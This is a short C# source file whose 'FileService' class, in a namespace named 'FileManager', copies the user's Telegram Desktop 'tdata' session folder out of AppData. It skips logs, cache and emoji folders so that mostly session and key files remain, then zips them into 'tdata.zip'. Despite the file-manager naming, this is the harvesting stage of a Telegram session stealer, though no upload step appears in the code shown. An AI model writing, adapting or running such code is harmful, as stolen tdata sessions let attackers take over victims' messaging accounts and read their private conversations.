using System.IO.Compression;
using System.Security.Cryptography.X509Certificates;

namespace FileManager.Services;

public class FileService
{
    public string GetData()
    {
        var sourcePath = $@"C:\Users\{Environment.UserName}\AppData\Roaming\Telegram Desktop\tdata";
        var destinationPath = Path.Combine(Directory.GetCurrentDirectory(), "data");

        if (Directory.Exists(destinationPath))
            Directory.Delete(destinationPath, true);

        FilterData(sourcePath, destinationPath);

        return destinationPath;
    }

    private void FilterData(string sourcePath, string destinationPath)
    {
        var files = Directory.GetFiles(sourcePath);
        var directories = Directory.GetDirectories(sourcePath);

        //Check and create destination directory
        if (!Directory.Exists(destinationPath))
            Directory.CreateDirectory(destinationPath);

        //Copy FIles
        foreach (var file in files)
        {
            if (file.Contains("log") || file.Contains("working")) continue;
            File.Copy(file, Path.Combine(destinationPath, Path.GetFileName(file)));
        }

        //Copy Directories 
        foreach (var directory in directories)
        {
            if (directory.Contains("user") || directory.Contains("dum") || directory.Contains("emoj")) continue;

            FilterData(directory, Path.Combine(destinationPath, Path.GetFileName(directory)));
        }
    }

    public string CreateZipFile(string sourcePath)
    {
        var destPath = Path.Combine(Directory.GetCurrentDirectory(), "tdata.zip");
        ZipFile.CreateFromDirectory(sourcePath, destPath);

        return destPath;
    }
}
